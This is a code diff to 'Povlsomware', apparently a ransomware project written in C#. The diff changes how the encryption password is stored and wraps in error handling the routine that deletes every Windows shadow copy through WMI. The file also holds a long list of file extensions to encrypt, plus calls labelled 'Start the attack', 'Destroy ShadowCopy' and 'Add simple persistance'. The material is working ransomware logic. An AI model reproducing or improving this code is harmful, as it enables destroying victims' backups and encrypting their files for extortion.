@@ -15,26 +15,24 @@ namespace Povlsomware
     {
         public static int count = 0;
         public static List<string> encryptedFiles = new List<string>();
-        private static readonly string password = "blahblah"; //The Encryption password. Change to your needs. 
+        private static char[] password = new char[] { 'b', 'l', 'a', 'h', 'b', 'l', 'a', 'h' };
         private static readonly string[] extensionsToEncrypt = { "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite", "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd", "wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf", "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay", "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob", "wmv" }; //files to decrypt
 
 
         [STAThread]
-        public static string GetPass()
+        public static char[] GetPass()
         {
             return password;
-
-
         }
 
         static void Main()
         {
             //Start the attack
             Attack();
-
+            
             //Destroy ShadowCopy
             DestroyCopy();
-
+            
             //Add simple persistance
             SetStartup();
 
@@ -93,20 +91,29 @@ namespace Povlsomware
                 WindowsPrincipal principal = new WindowsPrincipal(identity);
                 isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
             }
+            
             if (isElevated)
             {
                 string NamespacePath = "\\\\.\\ROOT\\cimv2";
                 string ClassName = "Win32_ShadowCopy";
                 //Create ManagementClass
                 ManagementClass oClass = new ManagementClass(NamespacePath + ":" + ClassName);
-
+                
                 //Get all instances of the class and enumerate them
-                foreach (ManagementObject oObject in oClass.GetInstances())
+                try {
+                    foreach (ManagementObject oObject in oClass.GetInstances())
+                    {
+                        //access a property of the Management object
+                        oObject.Delete();
+                    }
+                } catch (Exception e)
                 {
-                    //access a property of the Management object
-                    oObject.Delete();
+                    Console.WriteLine("Could not delete shadow copy if any " + e.Message);
                 }
+
+
             }
+            
         }
 
         //Encrypt the file
